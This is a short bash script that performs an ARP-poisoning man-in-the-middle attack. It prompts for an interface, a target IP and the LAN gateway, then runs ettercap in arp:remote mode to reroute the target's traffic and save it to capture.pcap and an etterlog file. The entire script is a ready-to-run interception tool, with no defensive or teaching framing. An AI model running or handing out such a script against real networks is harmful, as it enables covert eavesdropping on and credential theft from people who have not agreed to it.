#Arp poison target for use with passive scanning
#! /bin/bash

tcpdump -D

echo Enter the desired interface to reroute traffic through
read interface
echo Enter the target IP address
read target
echo Enter the default gateway on your LAN
read gateway

echo Captured packets can be found under pwd, run etterlog on .eci file
echo Press q to stop

ettercap -M arp:remote -i $interface -T  //$gateway/ //$target/ -QS -w capture.pcap -l etterlog



